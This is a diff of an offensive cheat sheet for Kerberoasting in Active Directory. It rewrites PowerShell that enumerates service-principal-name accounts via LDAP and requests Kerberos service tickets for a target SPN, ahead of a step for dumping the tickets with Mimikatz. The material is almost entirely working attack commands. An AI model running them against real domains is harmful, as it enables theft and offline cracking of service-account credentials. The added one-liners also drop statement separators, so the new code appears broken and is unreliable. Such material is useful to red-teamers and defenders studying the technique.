@@ -16,20 +16,7 @@ setspn -T <domain> -Q */*                         //Builtin
 Enumerate with LDAP Powershell module
 
 ```
-$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))";
-$domain = New-Object System.DirectoryServices.DirectoryEntry;
-$search = New-Object System.DirectoryServices.DirectorySearcher;
-$search.SearchRoot = $domain;
-$search.PageSize = 1000;
-$search.Filter = $ldapFilter;
-$search.SearchScope = "Subtree";
-$results = $search.FindAll()
-$Results = foreach ($result in $results){
-$result_entry = $result.GetDirectoryEntry();
-$result_entry | Select-Object @{
-Name = "Username"; 
-Expression = { $_.sAMAccountName }},@{Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }}}
-$Results;
+$ldapFilter="(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))";$domain=New-Object System.DirectoryServices.DirectoryEntry;$search=New-Object System.DirectoryServices.DirectorySearcher;$search.SearchRoot=$domain;$search.PageSize=1000;$search.Filter=$ldapFilter;$search.SearchScope="Subtree";$results=$search.FindAll()$Results=foreach($result in $results){$result_entry=$result.GetDirectoryEntry();$result_entry|Select-Object @{Name="Username";Expression={$_.sAMAccountName}},@{Name="SPN";Expression={$_.servicePrincipalName|Select-Object -First 1}}}$Results;
 ```
 
 Enumerate past remote sessions on local machine
@@ -41,8 +28,7 @@ klist
 Request a Service Ticket from the target. The ticket will be stored in memory
 
 ```
-Add-Type -AssemblyName System.IdentityModel  
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+Add-Type -AssemblyName System.IdentityModel;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 ```
 
 Dump the SPN ticket using Mimikatz
